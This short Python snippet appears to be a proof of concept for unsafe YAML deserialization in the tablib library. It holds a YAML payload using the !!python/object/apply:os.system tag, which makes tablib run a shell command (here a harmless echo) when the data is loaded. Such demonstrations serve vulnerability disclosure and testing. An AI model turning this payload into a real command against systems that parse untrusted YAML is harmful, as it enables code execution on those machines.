import tablib
# A malicious YAML file that contains Python code
yaml_file = """
- !!python/object/apply:os.system ["echo Hello World"]
"""
# Loading the YAML file as a Databook
databook = tablib.Databook().load("yaml", yaml_file)
# The Python code is executed and prints "Hello World" to the console